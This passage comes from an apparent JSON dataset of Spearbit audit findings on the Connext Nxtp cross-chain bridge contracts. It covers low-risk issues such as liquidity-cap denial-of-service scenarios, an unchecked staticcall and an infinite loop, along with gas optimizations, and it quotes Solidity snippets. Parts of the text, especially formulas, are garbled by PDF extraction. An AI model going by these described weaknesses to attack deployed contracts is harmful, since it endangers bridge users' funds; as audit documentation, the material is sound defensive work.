iff (_adooted == address(0)) s.adoptedToCanonical[adopted].domain = _canonical.domain; s.adoptedToCanonical[adopted].id = _canonical.id; These two values are used for generating the key to determine if a particular asset has been approved. Additionally, zero value is treated as a null check within the AssetLogic.getCanonicalTokenId function: // Check to see if candidate is an adopted asset. _canonical = s.adoptedToCanonical[_candidate]; if (_canonical.domain != 0) { // Candidate is an adopted asset, return canonical info. return _canonical; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When initializing Connext bridge make sure _xAppConnectionManager domain matches the one pro- vided to the initialization function for the bridgee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The only contract that implements IConnectorManager fully is SpokeConnector (through inheriting ConnectorManager and overriding localDomain): 45 // File: SpokeConnector.sol function localDomain() external view override returns (uint32) { return DOMAIN; } So a SpokeConnector or a IConnectorManager has its own concept of the local domain (the domain that it lives / is deployed on). And this domain is used when we are hashing messages and inserting them into the SpokeCon- nector's merkle tree: // File: SpokeConnector.sol bytes memory _message = Message.formatMessage( DOMAIN, bytes32(uint256(uint160(msg.sender))), _nonce, _destinationDomain, _recipientAddress, _messageBody ); // Insert the hashed message into the Merkle tree. bytes32 _messageHash = keccak256(_message); // Returns the root calculated after insertion of message, needed for events for // watchers (bytes32 _root, uint256 _count) = MERKLE.insert(_messageHash); We need to make sure that this local domain matches the _domain provided to this init function. Otherwise, the message hashes that are inserted into SpokeConnector's merkle tree would have 2 different origin domains linked to them. One from SpokeConnector in this message hash and one from connext's s.domain = _domain which is used in calculating the transfer id hash. The same issue applies to setXAppConnectionManager.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The stable swap pools used in Connext are incompatible with tokens with varying decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The stable swap functionality used in Connext calculates and stores for each token in a pool, the token's precision relative to the pool's precision. The token precision calculation uses the token's decimals. And since this precision is only set once, for a token that can have its decimals changed at a later time in the future, the precision used might not be always accurate in the future. And so in the event of a token decimal change, the swap calculations involving this token would be inaccurate. For exmpale in _xp(...): function _xp(uint256[] memory balances, uint256[] memory precisionMultipliers) internal pure returns (uint256[] memory) uint256 numTokens = balances.length; require(numTokens == precisionMultipliers.length, \"mismatch multipliers\"); uint256[] memory xp = new uint256[]numTokens; for (uint256 i; i < numTokens; ) { xp[i] = balances[i] * precisionMultipliers[i]; unchecked { ++i; } } return xp; { } We are multiplying in xp[i] = balances[i] * precisionMultipliers[i]; and cannot use division for tokens that have higher precision than the pool's default precision.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When Connext reaches the cap allowed custodied, race conditions can be created",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When IERC20(local).balanceOf(address(this)) is close to s.caps[key] (this can be relative/subjective) for a canonical token on its canonical domain, a race condition gets created where users might try to frontrun each others calls to xcall or xcallIntoLocal to be included in a cross chain transfer. This race condition is actually between all users and all liquidity routers. Since there is a same type of check when routers try to add liquidity. uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent sequencers from signing multiple routes for the same cross-chain transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Liquidity routers only sign the hash of (transferId, pathLength) combo. This means that each router does not have a say in: 1. The ordering of routers provided/signed by the sequencer. 2. What other routers are used in the sequence. If a sequencer signs 2 different routes (set of routers) for a cross-chain transfer, a relayer can decide which set of routers to use and provide to BridgeFacet.execute to make sure the liquidity from a specific set of routers' balances is used (also the same possibility if 2 different sequencers sign 2 different routes for a cross-chain transfer).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Well-funded malicious actors can DOS the bridge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A malicious actor (e.g. a well-funded cross-chain messaging competitor) can DOS the bridge cheaply. Assume Ethereum <-> Polygon bridge and the liquidity cap is set to 1m for USDC. 1. Using a slow transfer to avoid router liquidity fees, Bob (attacker) transferred 1m USDC from Ethereum to Polygon. 1m USDC will be locked on Connext's Bridge. Since the liquidity cap for USDC is filled, no one will be able to transfer any USDC from Ethereum to Polygon unless someone transfers POS-USDC from Polygon to Ethereum to reduce the amount of USDC held by the bridge. 2. On the destination chain, nextUSDC (local bridge asset) will be swapped to POS-USDC (adopted asset). The swap will incur low slippage because it is a stablewap. Assume that Bob will receive 999,900 POS-USDC back on Polygon. A few hundred or thousand loss is probably nothing for a determined competitor that wants to harm the reputation of Connext. 3. Bob bridged back the 999,900 POS-USDC using Polygon's Native POS bridge. Bob will receive 999,900 USDC in his wallet in Ethereum after 30 minutes. It is a 1-1 exchange using a native bridge, so no loss is incurred here. 4. Whenever the liquidity cap for USDC gets reduced on Connext's Bridge, Bob will repeat the same trick to keep the bridge in an locked state. 5. If Bob is well-funded enough, he could perform this against all Connext's bridges linked to other chains for popular assets (e.g. USDC), and normal users will have issues transferring popular assets when using xcall.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "calculateTokenAmount is not checking whether amounts provided has the same length as balances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There is no check to make sure amounts.length == balances.length in calculateTokenAmount: function calculateTokenAmount( Swap storage self, uint256[] calldata amounts, bool deposit ) internal view returns (uint256) { uint256 a = _getAPrecise(self); uint256[] memory balances = self.balances; ... There are 2 bad cases: 49 1. amounts.length > balances.length, in this case, we have provided extra data which will be ignored silently and might cause miscalculation on or off chain. 2. amounts.length < balances.length, the loop in calculateTokenAmount would/should revert becasue of an index-out-of-bound error. In this case, we might spend more gas than necessary compared to if we had performed the check and reverted early.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Rearrange an expression in _calculateSwapInv to avoid underflows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the following expression used in SwapUtils_calculateSwapInv, if xp[tokenIndexFrom] = x + 1 the expression would underflow and revert. We can arrange the expression to avoid reverting in this edge case. dx = x - xp[tokenIndexFrom] + 1;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The pre-image of DIAMOND_STORAGE_POSITION's storage slot is known",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The preimage of the hashed storage slot DIAMOND_STORAGE_POSITION is known.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The @param NatSpec comment for _key in AssetLogic._swapAsset is incorrect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The @param NatSpec for _key indicates that this parameter is a canonical token id where instead it should mention that it is a hash of a canonical id and its corresponding domain. We need to make sure the correct value has been passed down to _swapAsset.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Malicious routers can temporarily DOS the bridge by depositing a large amount of liquidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both router and bridge share the same liquidity cap on the Connext bridge. Assume that the liquidity cap for USDC is 1 million on Ethereum. Shortly after the Connext Amarok launch, a router adds 1 million USDC liquidity. No one would be able to perform a xcall transfer with USDC from Ethereum to other chains as it will always revert because the liquidity cap has exceeded. The DOS is temporary because the router's liquidity on Ethereum will be reduced if there is USDC liquidity flowing in the opposite direction (e.g., From Polygon to Ethereum)",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent deploying a representation token twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function setupAsset() is protected by _enrollAdoptedAndLocalAssets() which checks s.approvedAssets[_key] to prevent accidentally setting up an asset twice. However the function _removeAssetId() is rather thorough and removes the s.approvedAssets[_key] flag. After a call to _removeAssetId(), an asset can be recreated via setupAsset(). This will deploy a second representation token which will be confusing to users of Connext. Note: The function setupAssetWithDeployedRepresentation() could be used to connect a previous presentation token again to the canonical token. Note: All these functions are authorized so it would only be a problem if mistakes are made. 51 function setupAsset(...) ... onlyOwnerOrAdmin ... { if (_canonical.domain != s.domain) { _local = _deployRepresentation(...); // deploys a new token } else { ... } bytes32 key = _enrollAdoptedAndLocalAssets(_adoptedAssetId, _local, _stableSwapPool, _canonical); ... } function _enrollAdoptedAndLocalAssets(...) ... { ... if (s.approvedAssets[_key]) revert TokenFacet__addAssetId_alreadyAdded(); s.approvedAssets[_key] = true; ... } function _removeAssetId(...) ... { ... delete s.approvedAssets[_key]; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Extra safety checks in _removeAssetId()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _removeAssetId() deletes assets but it doesn't check if the passed parameters are a consistent set. This allows for mistakes where the wrong values are accidentally deleted. function _removeAssetId(bytes32 _key, address _adoptedAssetId, address _representation) internal { ... delete s.adoptedToCanonical[_adoptedAssetId]; delete s.representationToCanonical[_representation]; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Data length not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The following functions do not validate that the input _data is 32 bytes.  GnosisSpokeConnector._sendMessag  GnosisSpokeConnector._processMessage  BaseMultichain.sendMessage  OptimismSpokeConnector._sendMessage The input _data contains the outbound Merkle root or aggregated Merkle root, which is always 32 bytes. If the root is not 32 bytes, it is invalid and should be rejected.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify timestamp reliability on L2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Timestamp information on rollups can be less reliable than on mainnet. For instance, Arbitrum docs say: As a general rule, any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes). (It so happens these are generally the same assumptions one should operate under when using block numbers directly on Ethereum!) Uniswap docs mention this for Optimism: The block.timestamp of these blocks, however, reflect the block.timestamp of the last L1 block ingested by the Sequencer.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "MirrorConnector cannot be changed once set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For chains other than Polygon, it is allowed to change mirror connector any number of times. For Polygon chain, the _setMirrorConnector is overridden. 1. Let's take PolygonHubConnector contract example: function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxChildTunnel(_mirrorConnector); } 2. Since setFxChildTunnel(PolygonHubConnector) can only be called once due to below require check, this also restricts the number of time mirror connector can be altered. function setFxChildTunnel(address _fxChildTunnel) public virtual { require(fxChildTunnel == address(0x0), \"FxBaseRootTunnel: CHILD_TUNNEL_ALREADY_SET\"); ... } 54",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Possible infinite loop in dequeueVerified()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The loop in function dequeueVerified() doesn't end if queue.first == queue.last == 0. In this situation, at unchecked { --last; } the following happens: last wraps to type(uint128).max. Now last is very large and is surely >=first and thus the loop keeps running. This problem can occur when queue isn't initialized. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { uint128 first = queue.first; uint128 last = queue.last; require(last >= first, \"queue empty\"); for (last; last >= first; ) { ... unchecked { --last; } // underflows when last == 0 (e.g. queue isn't initialized) } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Do not ignore staticcall's return value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView calls several precompiles through staticcall opcode and never checks its return value assuming it is a success. For instance: TypedMemView.sol#L668-L669, TypedMemView.sol#L685-L686, // use the identity precompile to copy // guaranteed not to fail, so pop the success pop(staticcall(gas(), 4, _oldLoc, _len, _newLoc, _len)) However, there are rare cases when call to precompiles can fail. For example, when the call runs out of gas (since 63/64 of the gas is passed, the remaining execution can still have gas). Generally, not checking for success of calls is dangerous and can have unintended consequences.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk TypedMemView.sol#L652,"
        ]
    },
    {
        "title": "Renounce wait time can be extended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The _proposedOwnershipTimestamp updates everytime on calling proposeNewOwner with newlyPro- posed as zero address. This elongates the time when owner can be renounced.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Extra parameter in function checker() at encodeWithSelector()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function checker() sets up the parameters to call the function sendMessage(). However, it adds an extra parameter outboundRoot, which isn't necessary. function sendMessage() external { ... } function checker() external view override returns (bool canExec, bytes memory execPayload) { ... execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); // extra parameter ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "MerkleLib.insert() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "storage. Each call to MerkleLib.insert() reads the entire tree from storage, and writes 2 (tree.count and tree.branch[i]) back to storage. These storage operations can be done only once at the beginning, by loading them in memory. The updated count and branches can be written back to the storage at the end saving expensive SSTORE and SLOAD operations.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "EIP712 domain separator can be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The domain separator can be cached for gas-optimization.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "stateCommitmentChain can be made immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once assigned in constructor, stateCommitmentChain cannot be changed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Nonce can be updated in single step",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Nonce can be incremented in single step instead of using a second step which will save some gas",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ZkSyncSpokeConnector._sendMessage encodes unnecessary data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Augmenting the _data with the processMessage function selector is unnecessary. Since on the mirror domain, we just need to provide the right parameters to ZkSyncHubConnector.processMessageFromRoot (which by the way anyone can call) to prove the L2 message inclusion of the merkle root _data. Thus the current implementation is wasting gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "getD can be optimized by removing an extra multiplication by d per iteration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The calculation for the new d can be simplified by canceling a d from the numerator and denominator. Basically, we have : f (D) = 1 nn+1a Q xi Dn+1 + (1 (cid:0) 1 na )D (cid:0) X xi 59 and having/assuming n, a, xi are fixed, we are using Newton's method to find a solution for f = 0. The original implementation is using: D0 = D (cid:0) f (D) f 0(D) = which can be simplified to: (na P xi + Dn+1 nn(cid:0)1 Q xi )D (na (cid:0) 1)D + (n + 1) Dn+1 nn Q xi na P xi + D0 = Dn nn(cid:0)1 (na (cid:0) 1) + (n + 1) D Q xi Dn Q xi nn",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_recordOutputAsSpent in ArbitrumHubConnector can be optimized by changing the require condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In _recordOutputAsSpent, _index is compared with a literal value that is a power of 2. The expo- nentiation in this statement can be completely removed to save gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Message.leaf's memory manipulation is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The chunk of memory related to _message is dissected into pieces and then copied into another section of memory and hashed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "coerceBytes32 can be more optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It would be cheaper to not use TypedMemView in coerceBytes32(). We would only need to check the length and mask. Note: coerceBytes32 doesn't seem to be used. If that is the case it could also be removed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider removing domains from propagate() arguments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "propagate(uint32[] calldata _domains, address[] calldata _connectors) only uses _do- mains to verify its hash against domainsHash, and to emit an event. Hence, its only use seems to be to notify off-chain agents of the supported domains.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Loop counter can be made uint256 to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There are several loops that use an uint8 as the type for the loop variable. Changing that to uint256 can save some gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Set owner directly to zero address in renounceOwnership",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "1. In renounceOwnership function, _proposed will always be address zero so instead of setting the variable _proposed as owner, we can directly set address(0) as the new owner. 2. Similarly for renounceOwnership function also set address(0) as the new owner.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Retrieve decimals() once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There are several locations where the number of decimals() of tokens are retrieved. As all tokens are whitelisted, it would also be possible to retrieve the decimals() once and store these to save gas. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The root... function in Merkle.sol can be optimized by using YUL, unrolling loops and using the scratch space",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "We can use assembly, unroll loops, and use the scratch space to save gas. Also, rootWithCtx can be removed (would save us from jumping) since it has only been used here.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The insert function in Merkle.sol can be optimized by using YUL, unrolling loops and using the scratch space",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If we use assembly. the scratch space for hashing and unrolling the loop, we can save some gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "branchRoot function in Merkle.sol can be more optimized by using YUL, unrolling the loop and using the scratch space",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "We can use assembly, unroll the loop in branchRoot, and use the scratch space to save gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace divisions by powers of 2 by right shifts and multiplications by left shifts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When a variable X is divided (multiplied) by a power of 2 (C = 2  c) which is a constant value, the division (multiplication) operation can be replaced by a right (left) shift to save gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TypedMemView.castTo can be optimized by using bitmasks instead of multiple shifts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView.castTo uses bit shifts to clear the type flag bits of a memView, instead masking can be used. Also an extra OR is used to calculate the final view.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Make domain immutable in Facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Domain in Connector.sol is an immutable variable, however it is defined as a storage variable in LibConnextStorage.sol. Also once initialized in DiamondInit.sol, it cannot be updated again. To save gas, domain can be made an immutable variable to avoid reading from storage.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache router balance in repayAavePortal()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "repayAavePortal() reads s.routerBalances[msg.sender][local] twice: if (s.routerBalances[msg.sender][local] < _maxIn) revert PortalFacet__repayAavePortal_insufficientFunds(); ,! ... s.routerBalances[msg.sender][local] -= amountDebited; This can be cached to only read it once.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unrequired if condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The below if condition is not required as price will always be 0. This is because if contract finds direct price for asset it returns early, otherwise if no direct price then tokenPrice is set to 0. This means for the code ahead tokenPrice will currently be 0. function getTokenPrice(address _tokenAddress) public view override returns (uint256, uint256) { ... uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } if (tokenPrice == 0) { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Delete slippage for gas refund",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once s.slippage[_transferId] is read, it's never read again. It can be deleted to get some gas refund.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Emit event at the beginning in _setOwner()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "_setOwner() maintains an extra variable oldOwner just to emit an event later: function _setOwner(address newOwner) internal { address oldOwner = _owner; _owner = newOwner; _proposedOwnershipTimestamp = 0; _proposed = address(0); emit OwnershipTransferred(oldOwner, newOwner); } If this emit is done at the beginning, oldOwner can be removed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify the assignment logic of _params.normalizedIn in _xcall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When amount > 0 we should have asset != address(0) since otherwise the call would revert: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } and when amount == 0 _params.normalizedIn is 0 which is the value passed to _xcall from xcall or xcall- IntoLocal. So we can move the calculation for _params.normalizedIn into the if (_amount > 0) { block. 90 if (_amount > 0) { // Transfer funds of input asset to the contract from the user. AssetLogic.handleIncomingAsset(_asset, _amount); // Swap to the local asset from adopted if applicable. // TODO: drop the \"IfNeeded\", instead just check whether the asset is already local / needs swap here. _params.bridgedAmt = AssetLogic.swapToLocalAssetIfNeeded(key, _asset, local, _amount, ,! _params.slippage); // Get the normalized amount in (amount sent in by user in 18 decimals). _params.normalizedIn = AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); } gas saved according to test cases: test_Connext__bridgeFastOriginLocalToDestinationAdoptedShouldWork() (gas: -39 (-0.001%)) test_Connext__bridgeFastAdoptedShouldWork() (gas: -39 (-0.001%)) test_Connext__unpermissionedCallsWork() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_worksWithPositiveSlippage() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_adoptedTransferWorks() (gas: -39 (-0.003%)) test_Connext__permissionedCallsWork() (gas: -39 (-0.003%)) test_BridgeFacet__xcallIntoLocal_works() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_localTokenTransferWorksWithAdopted() (gas: -39 (-0.003%)) test_Connext__bridgeFastLocalShouldWork() (gas: -39 (-0.004%)) test_BridgeFacet__xcall_localTokenTransferWorksWhenNotAdopted() (gas: -39 (-0.004%)) test_Connext__bridgeSlowLocalShouldWork() (gas: -39 (-0.005%)) test_Connext__zeroValueTransferWithEmptyAssetShouldWork() (gas: -54 (-0.006%)) test_BridgeFacet__xcall_worksIfPreexistingRelayerFee() (gas: -39 (-0.013%)) test_BridgeFacet__xcall_localTokenTransferWorksWithoutAdopted() (gas: -39 (-0.013%)) test_BridgeFacet__xcall_zeroRelayerFeeWorks() (gas: -32 (-0.014%)) test_BridgeFacet__xcall_canonicalTokenTransferWorks() (gas: -39 (-0.014%)) test_LibDiamond__initializeDiamondCut_withZeroAcceptanceDelay_works() (gas: -3812 (-0.015%)) test_BridgeFacet__xcall_zeroValueEmptyAssetWorks() (gas: -54 (-0.034%)) test_BridgeFacet__xcall_worksWithoutValue() (gas: -795 (-0.074%)) test_Connext__zeroValueTransferShouldWork() (gas: -761 (-0.091%)) Overall gas change: -6054 (-0.308%) Note, we need to make sure in future updates the value of _params.normalizedIn == 0 for any invocation of _xcall. Connext: Solved in PR 2511. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify BridgeFacet._sendMessage by defining _token only when needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In BridgeFacet._sendMessage, _local might be a canonical token that does not necessarily have to follow the IBridgeToken interface. But that is not an issue since _token is only used when !_isCanonical.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using BridgeMessage library in BridgeFacet._sendMessage can be avoid to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
